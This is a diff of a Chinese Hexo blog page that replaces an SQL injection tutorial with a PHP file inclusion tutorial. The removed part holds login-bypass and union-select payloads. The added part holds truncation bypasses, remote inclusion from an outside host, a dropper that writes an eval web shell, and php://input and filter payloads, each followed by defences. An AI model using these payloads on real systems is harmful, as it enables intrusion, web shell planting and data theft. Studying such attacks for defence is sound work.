@@ -6,24 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>sql注入漏洞原理 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞">
+  <meta name="description" content="关于文件包含漏洞，我觉得和ssrf漏洞有点儿像，ssrf漏洞是通过curl()函数获取信息但是没有进行过滤，从而访问到内网造成危害，文件包含漏洞则是通过include()函数获取文件，攻击者输入敏感文件导致敏感文件也被输出从而产生危害。 原理开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。 为了使代码更加灵活，通常">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入漏洞原理">
-<meta property="og:url" content="http://example.com/2021/07/10/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2021/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞">
+<meta property="og:description" content="关于文件包含漏洞，我觉得和ssrf漏洞有点儿像，ssrf漏洞是通过curl()函数获取信息但是没有进行过滤，从而访问到内网造成危害，文件包含漏洞则是通过include()函数获取文件，攻击者输入敏感文件导致敏感文件也被输出从而产生危害。 原理开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。 为了使代码更加灵活，通常">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210710193652853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210710200606847.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210710201623407.png">
-<meta property="article:published_time" content="2021-07-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-09-13T05:42:23.149Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c1438a33fde3428b81c28061554556b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9e80d5f8c2d34f25894ad0395c231510.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_10,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2021-09-30T02:22:10.605Z">
+<meta property="article:modified_time" content="2021-09-30T02:21:55.629Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210710193652853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/c1438a33fde3428b81c28061554556b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -175,57 +173,87 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-SQL注入" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-文件包含漏洞" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      sql注入漏洞原理
-    </h1>
-  
-
-        
-        <a href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2021-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-10</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sql注入是当今web最具有危害的漏洞之一，在web漏洞里出现的次数可以说是名列前茅<br>本文主要是讲述sql注入漏洞的原理，这个漏洞是如何产生，以及如何防范sql漏洞</p>
-<span id="more"></span>
+        <p>关于文件包含漏洞，我觉得和ssrf漏洞有点儿像，ssrf漏洞是通过curl()函数获取信息但是没有进行过滤，从而访问到内网造成危害，文件包含漏洞则是通过include()函数获取文件，攻击者输入敏感文件导致敏感文件也被输出从而产生危害。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。</p>
+<p>为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
+<p>PHP中提供了四种文件包含函数:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()<span class="comment">//只有程序执行到include()函数时，才包含文件，发生错误代码也继续向下执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>()<span class="comment">//与include()相同，但是重复调用同一个文件时，程序只调用一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()<span class="comment">//与include()区别在于包含文件如果发生错误，程序则终止执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//与include_once和include的区别相同</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h2><p>sql注入是用户在提交参数时参杂了sql注入代码，并且被后端执行了，这样就导致漏洞的产生<br>归根到底就是程序员没有对参数进行过滤，以及防护，下面举了几个典型的注入例子</p>
-<p>下面是一个有注入漏洞的登陆界面的后端</p>
-<p>用户通过前端把账号和密码分别提交到$userName 和$Password中</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="variable">$dbServername</span>,<span class="variable">$dbUsername</span>,<span class="variable">$dbPassword</span>,<span class="variable">$dbName</span>);<span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$userName</span>&#x27; and password=&#x27;<span class="subst">$Password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql1</span>)；</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;log in&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;erro&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到，用户提交的账号和密码直接被连接数据库使用了，并且以返回结果的成功与否来判断是否</p>
-<p>这样当我们输入账户时输入 1’ or 1=1#<br>这样我们的连接mysql的语句就是</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$Password<span class="string">&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到后面输入密码的部分被#给注释掉了，而且最终这条语句被执行后返回值一定是真</p>
-<p>也就是$result一定为真，那么我们不用输入密码就直接登录成功了,这就是一个简单的post注入</p>
-<h2 id="0X01-sql注入原理"><a href="#0X01-sql注入原理" class="headerlink" title="#0X01 sql注入原理"></a>#0X01 sql注入原理</h2><p>我们知道了sql注入漏洞的原理后，还得知道sql注入的原理，这样能方便我们对sql注入更好的理解</p>
-<h3 id="mysql中重要的表"><a href="#mysql中重要的表" class="headerlink" title="mysql中重要的表"></a>mysql中重要的表</h3><p>在Mysql 5.0以上版本，定义了<strong>information_schema</strong>数据库,用来存储数据库元信息。<br>其中<strong>schemata</strong>表中：<strong>schema_name</strong>用来存储数据库名.</p>
-<p><strong>tables</strong>表中：<strong>table_schema</strong>和<strong>table_name</strong>分别用来存储数据库名和表名。</p>
-<p><strong>columns</strong>表中:<strong>table_schema</strong>(数据库名)，<strong>table_name</strong>(表名)，<strong>column_name</strong>(字段名)</p>
-<p>通过这些表，我们能把数据库中几乎所有的数据都给查询到，也是sql注入的基石</p>
-<h3 id="简单的sql注入案例（整型注入）"><a href="#简单的sql注入案例（整型注入）" class="headerlink" title="简单的sql注入案例（整型注入）"></a>简单的sql注入案例（整型注入）</h3><p>这是一道简单的有整型注入的题<br><img src="https://img-blog.csdnimg.cn/20210710193652853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTUzODE0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">当我们输入1时，其后端内部信息是</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sele <span class="operator">*</span><span class="keyword">from</span> news <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>于是我们就可以通过输入sql语句，达到注入效果</p>
-<p>当我们输入-1 union select 1,2时可以看到，对应的回显变成了我们的1,2<br>    <img src="https://img-blog.csdnimg.cn/20210710200606847.png" alt="在这里插入图片描述"></p>
-<p>我们也可以通过 select *from news where id=-1 union select database()，version()来查询数据库对应的版本</p>
-<p>这里我用 select * from news where id=-1 union select 1, group_concat(schema_name)from information_schema.schemata来查询所有的数据库<br> <img src="https://img-blog.csdnimg.cn/20210710201623407.png" alt="在这里插入图片描述">图中红框内就是我们所有的数据库</p>
-<p> 通过相同方法，我们可以用schemata表和tables表和columns表获取数据库中所有的表和字段的信息</p>
-<p>这就是最基础的sql整型注入原理，还有其他注入类型在我的另一篇有详细解释<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51553814/article/details/118639300">sql注入案例</a></p>
-<h2 id="0X02-sql注入防范"><a href="#0X02-sql注入防范" class="headerlink" title="#0X02 sql注入防范"></a>#0X02 sql注入防范</h2><p>既然发现了漏洞就需要我们进行防范了<br>通常是以下几个防范办法</p>
+<h1 id="文件包含类型"><a href="#文件包含类型" class="headerlink" title="文件包含类型"></a>文件包含类型</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><pre><code>当本地存在敏感文件时，包含本地的文件，就是本地文件包含(就是字面意思)
+例如下面有一个含有文件包含的PHP文件
+</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>而就在相同目录下有这样一个3.txt文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们在url上输入?file=3.txt<br><img src="https://img-blog.csdnimg.cn/c1438a33fde3428b81c28061554556b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>就读取到了该文件的内容，需要注意的时，虽然我们读取的文件时txt文件，但是include的函数会先用php解析一遍(哪怕是jpg,png也不例外)，如果可以运行那么就当作php文件输出，如果不行就直接输出文本，</p>
+<p>像这类情况通常是出现在有文件上传功能的网页中，当用户上传了图片，或者是文本时，当用户需要读取该文件时，假如服务器后端没有对GET获取的file过滤，那么就有可能造成用户任意读取文件。</p>
+<h3 id="有限制的本地文件包含漏洞绕过"><a href="#有限制的本地文件包含漏洞绕过" class="headerlink" title="有限制的本地文件包含漏洞绕过"></a>有限制的本地文件包含漏洞绕过</h3><p>假如服务器在后端进行了过滤，常用的绕过方法有%00截断，路劲长度截断文件包含，点号阶段文件包含</p>
 <ol>
-<li>数据库的普通用户权限和管理员权限分明，用户提交数据后，所连接的数据库权限应该是普通用户级别，这样就防止了sql注入代码对数据库进行增加或删除数据的操作</li>
-<li>将用户输入的语句参数化，而不是直接嵌入到sql语句当中，这样的好处就是我们可以对用户提交上去的数据进行验证和过滤，过滤主要是过滤掉空格或者是特殊字符，甚至可以把sql注入中的一些敏感字符给过滤掉</li>
-<li>对用户加以输入加以限制，在后端对用户输入添加字符限制，如果你只想用户输入数字，那么就对相应的参数加以验证，其他的同样如此，尽量让用户只能输入你想要他输入的东西。</li>
+<li><p>%00截断<br>当服务器在后端会默认给你文件添加后缀时，%00是结束符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>,<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当以上这种情况，文件名为%00可以讲后面的.html截断(00截断的使用条件是PHP版本低于5.3且php.ini中magic_quotes_gpc=off)</p>
+</li>
+<li><p>路径长度截断文件包含(./和.截断)<br>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></span><br><span class="line"></span><br><span class="line">执行完成后成功截断后面的.html扩展名，包含了<span class="number">1</span>.txt文件</span><br></pre></td></tr></table></figure></li>
 </ol>
+<p>大概意思意思就是在文件名后面加若干个./，目录名有一个最大长度，当目录名超过这个最大长度，超过部分就不会被系统读取。</p>
+<p>weindows下目录最大路劲为256B、linux为4096B<br>也就是在版本低于5.3的情况下，Windows下连续240个点（.）或者(./)可以截断，Linux下连续2038个/.可以截断。</p>
+<ol start="3">
+<li>远程包含的?截断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>,<span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+在上面这段代码中，我们在testrfi.com主机的Web目录下创建phpinfo.txt，提交请求127.0.0.1/test.php?url=phpinfo.txt?后发现返回了主机的phpinfo信息。这是因为服务器解析的内容为127.0.0.1/test.php?url=phpinfo.txt?.php，它把?后面的内容作为了参数，因此实现了截断。<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2>远程文件包含首先需要在php.ini中开启下面的配置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = Off //把Off改成On</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>简单来说，就是服务器通过include()函数，包含了别的网页的某个目录的文件</p>
+<p>例如我在url上输入 ?file=192.168.0.2/web/.1.txt</p>
+<p>最后就会输出1.txt文件，这里也不多演示了，原理很简单。</p>
+<h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><p>上文我们说了可以访问别的网站目录下的文件，利用这一点，我们可以做一个一句话shell<br>简单理解就是运行的其他网页的代码内容是：在当前目录创建一个1.php文件，文件内容<?php @eval($_POST['shell']?></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;shell&#x27;])?&gt;&quot;</span></span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>之后就可以通过蚁剑连接了</p>
+<h3 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h3><p>指当进行远程文件包含时遇到过滤或者是添加扩展名<br><strong>漏洞代码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">     <span class="keyword">include</span>(<span class="variable">$filename</span>.”.html”);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>?绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt">http://192.168.1.110/xiaohua.txt</a>?</li>
+<li>#绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt%23(#%E5%8F%B7%E8%A6%81%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%23(#号要编码)</a></li>
+<li>空格绕过<br>?filename=<a target="_blank" rel="noopener" href="http://192.168.1.110/xiaohua.txt%20(%20%E6%98%AF%E7%A9%BA%E6%A0%BC%E7%9A%84url%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</a></li>
+</ol>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>php伪协议不陌生了，在ssrf漏洞中也有用到<br>php自带了很多url风格的封装协议，在文件包含时也可以利用这些伪协议</p>
+<p><img src="https://img-blog.csdnimg.cn/9e80d5f8c2d34f25894ad0395c231510.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a>php://伪协议</h2><p>首先伪协议运行是有条件的，在php.ini中下面两个配置必许是On状态</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=on</span><br><span class="line"></span><br><span class="line">allow_url_fopen=on </span><br></pre></td></tr></table></figure>
+
+<p><strong>1、php://fiter</strong><br>使用方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1):filename=php://filter/read=convert.base64-encode/resource=xx.php</span><br><span class="line">(2):filename=php://filter/convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+<p>read=convert.base64-encode的意思是把文件base64编码后输出文件，主要是防止文件中有类似于//这种注释，或者不能显现出来的字符，直接输出base64编码就能全部把文件代码显示出来。</p>
+<p><strong>2、php://input</strong><br>我的理解是php://input伪协议可以把文件上传的POST数据当作php代码使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>
+<p>例如我们在POST中输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;dir&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>页面就会返回当前目录所有的目录文件</p>
+<p>也可以像远程文件包含那样注入shell</p>
+<p><strong>3、file://</strong><br>可以访问本地文件系统，读取文件内容<br>使用方法:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/file.php?filename=file://C:\phpStudy\PHPTutorial\WWW\xiaohua.txt</span><br></pre></td></tr></table></figure>
+<p>这个协议可以任意内网中的文件，在ssrf漏洞中也有用到</p>
+<p><strong>4、data://</strong><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码<br>使用方法:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ol>
+<li><p>进行文件过滤，尽量采用白名单的方法，安全度更高</p>
+</li>
+<li><p>修改php.ini配置文件，关闭不必要的协议</p>
+</li>
+<li><p>本地目录不要放不安全的文件，防止被本地文件包含 </p>
+</li>
+<li><p>路径限制，一定要禁止目录跳转符，例如/./ 或者是..等等</p>
+</li>
+</ol>
+<p>学习参考:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12216170.html">文件包含漏洞1</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/richardlee97/p/10542057.html">文件包含漏洞2</a></p>
 
       
 
@@ -255,17 +283,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -316,7 +333,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/07/10/SQL%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -330,15 +347,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/07/10/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sql注入原理
-        
-      </div>
-    </a>
   
+    <a href="/2021/09/30/csrf/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
